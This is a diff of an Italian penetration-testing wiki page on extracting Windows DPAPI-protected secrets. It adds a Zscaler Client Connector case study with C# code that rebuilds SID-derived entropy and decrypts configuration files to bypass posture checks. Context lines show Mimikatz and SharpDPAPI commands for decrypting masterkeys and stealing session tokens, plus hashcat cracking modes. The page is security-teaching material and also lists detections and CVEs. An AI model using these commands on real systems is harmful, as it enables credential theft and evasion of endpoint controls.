@@ -30,7 +30,7 @@ Nota che la **chiave di dominio utilizzata per cifrare la chiave master si trova
 I blob cifrati contengono il **GUID della chiave master** che è stata utilizzata per cifrare i dati all'interno delle sue intestazioni.
 
 > [!TIP]
-> I blob cifrati da DPAPI iniziano con **`01 00 00 00`**
+> I blob cifrati DPAPI iniziano con **`01 00 00 00`**
 
 Trova le chiavi master:
 ```bash
@@ -41,7 +41,7 @@ Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
 Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
 Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
 ```
-Questo è l'aspetto di un insieme di Master Keys di un utente:
+Questo è l'aspetto di un gruppo di Master Keys di un utente:
 
 ![](<../../images/image (1121).png>)
 
@@ -59,7 +59,7 @@ Nota che queste chiavi **non hanno un backup di dominio**, quindi sono accessibi
 Tra i dati personali protetti da DPAPI ci sono:
 
 - Credenziali di Windows
-- Password di Internet Explorer e Google Chrome e dati di completamento automatico
+- Password e dati di completamento automatico di Internet Explorer e Google Chrome
 - Password per e-mail e account FTP interni per applicazioni come Outlook e Windows Mail
 - Password per cartelle condivise, risorse, reti wireless e Windows Vault, inclusi i tasti di crittografia
 - Password per connessioni desktop remoto, .NET Passport e chiavi private per vari scopi di crittografia e autenticazione
@@ -100,7 +100,7 @@ dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER
 # SharpDPAPI
 SharpDPAPI.exe masterkeys /password:PASSWORD
 ```
-- Se sei all'interno di una sessione come utente, è possibile chiedere al DC per la **chiave di backup per decrittare le chiavi master utilizzando RPC**. Se sei un amministratore locale e l'utente è connesso, potresti **rubare il suo token di sessione** per questo:
+- Se sei all'interno di una sessione come utente, è possibile chiedere al DC per la **chiave di backup per decrittografare le chiavi master utilizzando RPC**. Se sei un amministratore locale e l'utente è connesso, potresti **rubare il suo token di sessione** per questo:
 ```bash
 # Mimikatz
 dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc
@@ -182,7 +182,7 @@ dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" 
 # SharpDPAPI
 SharpDPAPI.exe masterkeys /rpc
 ```
-Lo strumento **SharpDPAPI** supporta anche questi argomenti per la decrittazione della masterkey (nota come sia possibile utilizzare `/rpc` per ottenere la chiave di backup dei domini, `/password` per utilizzare una password in chiaro, o `/pvk` per specificare un file di chiave privata del dominio DPAPI...):
+Lo strumento **SharpDPAPI** supporta anche questi argomenti per la decrittazione della masterkey (nota come sia possibile utilizzare `/rpc` per ottenere la chiave di backup dei domini, `/password` per utilizzare una password in chiaro, o `/pvk` per specificare un file di chiave privata DPAPI...):
 ```
 /target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
 /pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
@@ -244,7 +244,7 @@ SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
 ```
 ### Cracking masterkeys offline (Hashcat & DPAPISnoop)
 
-Microsoft ha introdotto un formato di masterkey **context 3** a partire da Windows 10 v1607 (2016). `hashcat` v6.2.6 (Dicembre 2023) ha aggiunto modalità hash **22100** (DPAPI masterkey v1 context), **22101** (context 1) e **22102** (context 3) consentendo il cracking accelerato da GPU delle password degli utenti direttamente dal file masterkey. Gli attaccanti possono quindi eseguire attacchi a dizionario o di forza bruta senza interagire con il sistema target.
+Microsoft ha introdotto un formato di masterkey **context 3** a partire da Windows 10 v1607 (2016). `hashcat` v6.2.6 (dicembre 2023) ha aggiunto modalità hash **22100** (DPAPI masterkey v1 context), **22101** (context 1) e **22102** (context 3) che consentono il cracking accelerato dalla GPU delle password degli utenti direttamente dal file masterkey. Gli attaccanti possono quindi eseguire attacchi a dizionario o di forza bruta senza interagire con il sistema target.
 
 `DPAPISnoop` (2024) automatizza il processo:
 ```bash
@@ -277,13 +277,13 @@ Con l'elenco dei computer estratti da LDAP puoi trovare ogni sottorete anche se 
 [**DonPAPI**](https://github.com/login-securite/DonPAPI) può estrarre segreti protetti da DPAPI automaticamente. La versione 2.x ha introdotto:
 
 * Raccolta parallela di blob da centinaia di host
-* Parsing delle masterkey di **context 3** e integrazione automatica con Hashcat
+* Parsing delle masterkey di **context 3** e integrazione automatica del cracking con Hashcat
 * Supporto per i cookie crittografati "App-Bound" di Chrome (vedi sezione successiva)
 * Una nuova modalità **`--snapshot`** per interrogare ripetutamente gli endpoint e differenziare i blob appena creati
 
 ### DPAPISnoop
 
-[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) è un parser C# per file masterkey/credential/vault che può esportare formati Hashcat/JtR e, facoltativamente, invocare automaticamente la decrittazione. Supporta completamente i formati di masterkey di macchina e utente fino a Windows 11 24H1.
+[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) è un parser C# per file masterkey/credential/vault che può esportare formati Hashcat/JtR e, facoltativamente, invocare automaticamente il cracking. Supporta completamente i formati di masterkey di macchina e utente fino a Windows 11 24H1.
 
 ## Rilevamenti comuni
 
@@ -297,9 +297,45 @@ Con l'elenco dei computer estratti da LDAP puoi trovare ogni sottorete anche se 
 ### Vulnerabilità 2023-2025 e cambiamenti nell'ecosistema
 
 * **CVE-2023-36004 – Spoofing del canale sicuro DPAPI di Windows** (novembre 2023). Un attaccante con accesso alla rete potrebbe ingannare un membro del dominio per recuperare una chiave di backup DPAPI malevola, consentendo la decrittazione delle masterkey utente. Corretto nell'aggiornamento cumulativo di novembre 2023 – gli amministratori dovrebbero assicurarsi che i DC e le workstation siano completamente aggiornati.
-* **Crittografia dei cookie "App-Bound" di Chrome 127** (luglio 2024) ha sostituito la protezione legacy solo DPAPI con una chiave aggiuntiva memorizzata sotto il **Credential Manager** dell'utente. La decrittazione offline dei cookie ora richiede sia la masterkey DPAPI che la **chiave app-bound avvolta in GCM**. SharpChrome v2.3 e DonPAPI 2.x sono in grado di recuperare la chiave extra quando eseguiti con il contesto utente.
+* **Crittografia dei cookie "App-Bound" di Chrome 127** (luglio 2024) ha sostituito la protezione legacy solo DPAPI con una chiave aggiuntiva memorizzata nel **Credential Manager** dell'utente. La decrittazione offline dei cookie ora richiede sia la masterkey DPAPI che la **chiave app-bound avvolta in GCM**. SharpChrome v2.3 e DonPAPI 2.x sono in grado di recuperare la chiave extra quando vengono eseguiti con il contesto utente.
+
+### Studio di caso: Zscaler Client Connector – Entropia personalizzata derivata da SID
+
+Zscaler Client Connector memorizza diversi file di configurazione in `C:\ProgramData\Zscaler` (ad es. `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Ogni file è crittografato con **DPAPI (ambito macchina)** ma il fornitore fornisce **entropia personalizzata** che è *calcolata a runtime* invece di essere memorizzata su disco.
+
+L'entropia è ricostruita da due elementi:
+
+1. Un segreto hard-coded incorporato all'interno di `ZSACredentialProvider.dll`.
+2. Il **SID** dell'account Windows a cui appartiene la configurazione.
+
+L'algoritmo implementato dalla DLL è equivalente a:
+```csharp
+byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
+byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);
+
+// XOR the two buffers byte-by-byte
+byte[] tmp = new byte[secret.Length];
+for (int i = 0; i < secret.Length; i++)
+tmp[i] = (byte)(sid[i] ^ secret[i]);
+
+// Split in half and XOR both halves together to create the final entropy buffer
+byte[] entropy = new byte[tmp.Length / 2];
+for (int i = 0; i < entropy.Length; i++)
+entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
+```
+Perché il segreto è incorporato in un DLL che può essere letto dal disco, **qualsiasi attaccante locale con diritti SYSTEM può rigenerare l'entropia per qualsiasi SID** e decrittografare i blob offline:
+```csharp
+byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
+byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
+Console.WriteLine(Encoding.UTF8.GetString(clear));
+```
+La decrittazione restituisce la configurazione JSON completa, inclusi ogni **controllo della postura del dispositivo** e il suo valore atteso – informazioni molto preziose quando si tentano bypass client-side.
+
+> SUGGERIMENTO: gli altri artefatti crittografati (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) sono protetti con DPAPI **senza** entropia (`16` byte zero). Possono quindi essere decrittografati direttamente con `ProtectedData.Unprotect` una volta ottenuti i privilegi di SYSTEM.
 
 ## Riferimenti
+
+- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
 
 - [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
 - [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
